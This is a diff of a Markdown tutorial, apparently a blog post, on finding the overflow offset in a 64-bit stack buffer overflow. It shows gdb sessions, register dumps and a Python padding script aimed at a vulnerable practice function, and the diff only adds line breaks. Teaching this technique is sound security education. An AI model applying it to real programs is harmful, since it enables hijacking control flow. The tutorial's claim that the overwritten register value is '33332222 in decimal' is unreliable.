@@ -222,7 +222,7 @@ Lets examine the stack frame
 
 * Here we can see that content of rpb got overwritten by 41414141 which is actually our input AAAA.
 * Lets see how many A's required to control rbp(it is easy using pattern generator, will discuss in upcoming blogs)
-* Lets run it again with input ``AAAAAAAAAAAAAAAAAAAAAAAA0000111122223333444455556666``.
+* Lets run it again with input ``AAAAAAAAAAAAAAAAAAAAAAAA0000111122223333444455556666``.<br>
 ```
 run AAAAAAAAAAAAAAAAAAAAAAAA0000111122223333444455556666
 The program being debugged has been started already.
@@ -242,6 +242,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x00000000004005b1 in vulnerable_function ()
 
 ```
+<br>
 * From the generated output notice that there is segmentation fault.
 * Lets examine the register.
 ```
@@ -272,20 +273,21 @@ fs             0x0	0
 gs             0x0	0
 
 ```
-
+<br>
 Here we can see that the content of ``rbp`` got overwritten with 0x3333333332323232 which is 33332222 in decimal, and  ``Little Endian`` notation of 22223333.
 
 Here unlike 32 bit we can not take direct control on rip, but rbp.
 Now from the given input we can conclude that a total of ``32 A's`` required + some 64 bit valid address in order to control rip and jump to some arbitrary address. <br>
 Lets create a python program which will print ``32 A's and 8 B's``<br>
 input.py
+<br>
 ```python
 #!/usr/bin/python
 buff='\x41'*32
 buff+='\x42'*8
 print buff
 ```
-Now lets run again the above code in gdb.
+Now lets run again the above code in gdb.<br>
 
 ```bash
 (gdb) run $(python input)
